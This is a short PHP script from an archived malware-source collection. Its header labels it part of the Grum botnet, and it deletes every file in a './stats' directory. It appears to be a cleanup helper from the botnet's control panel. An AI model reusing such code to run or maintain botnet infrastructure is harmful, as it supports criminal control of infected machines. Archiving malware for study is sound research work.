/*
  name      Grum
  type      botnet
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?

    $dir = "./stats";
    if (!is_dir($dir)) echo "error<BR>";        
    $handled = opendir($dir);
    
    $document = readdir($handled);        
    while (false !== ($document = readdir($handled)))
    {
      if($document != '.' && $document != '..')
        {           
           unlink("stats/".$document);
           
        }
    }
    
    echo "DELE";
  
  
  
?>